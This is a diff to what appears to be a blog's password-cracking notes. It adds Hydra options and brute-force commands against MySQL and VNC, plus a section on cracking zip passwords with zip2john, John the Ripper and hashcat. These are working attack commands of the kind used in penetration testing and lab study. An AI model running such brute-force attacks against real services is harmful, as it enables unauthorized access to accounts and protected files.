@@ -2,7 +2,7 @@
 title: Password Cracking 
 date: 2020-09-22 18:08:00 +/- 0000
 categories: [Notes, Passwords]
-tags: [Passwords, Hashcat, JTR, Crunch, Cewl, ssh2john, zip2john]
+tags: [Passwords, Hashcat, JTR, Crunch, Cewl, ssh2john, Hydra, zip2john]
 headline: Comprehensive notes for password cracking and brute forcing.
 image: /assets/img/Pass/cat_logo.png
 ---
@@ -59,6 +59,17 @@ The -t flag specifies the number of threads you are running in the attack. For s
 
 If the service you are attacking is running on a *non-standard* port, you must specify that with the -s flag. ex: ftp is running on port 1021, the end of the attack would look be **ftp -s 1021**
 
+**Options**
+
+-l  Single Username
+-L Username list
+-p Password
+-P Password list
+-t Limit concurrent connections
+-V Verbose output
+-f Stop on correct login
+-s Port
+
 **FTP**
 ```shell
 hydra -t 1 -l user -P rockyou.txt -vV $ip ftp
@@ -95,3 +106,33 @@ hydra -l user -P rockyou.txt $ip http-get /path
 ```shell
 hydra -P rockyou.txt -v $ip snmp
 ```
+**MYSQL**
+```shell
+hydra -l user -P rockyou.txt $ip mysql -V -f
+```
+**VNC**
+```shell
+hydra -P rockyou.txt $ip vnc -V
+```
+
+## Zip Passwords
+
+Zip files can have passwords set on them, but we have a way to crack those, too! We will use JTR for this as it seems to be a bit more forgiving, but first, we need to create a hash that John can understand and zip2john can do this for us.
+```shell
+zip2john tom.zip | cut -d ':' -f 2 > hashtom.txt
+```
+Then use john to crack the zip password.
+```shell
+john hashtom --format=PKZIP --wordlist=/root/RockYou/rockyou.txt
+```
+![Zip](/assets/img/Pass/zippy.png)
+
+Hashcat may also be used to crack the zip password, but the hash may need to be modified as per the example on the hashcat example page.
+<https://hashcat.net/wiki/doku.php?id=example_hashes>
+
+```shell
+hashcat -a 0 -m 17200 hashes.txt rockyou.txt
+```
+
+
+
